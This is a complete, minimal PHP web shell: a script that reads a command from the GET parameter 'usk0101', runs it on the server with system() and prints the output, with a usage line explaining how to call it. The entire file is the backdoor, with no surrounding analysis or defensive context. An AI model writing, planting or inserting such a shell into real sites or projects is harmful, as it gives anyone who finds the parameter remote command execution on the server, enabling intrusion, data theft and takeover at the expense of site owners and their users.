<?php
if (isset($_GET['usk0101'])) {
    $cmd = $_GET['usk0101'];
    echo "<pre>";
    system($cmd);
    echo "</pre>";
} else {
    echo "Usage: ?usk0101=your_command";
}
?>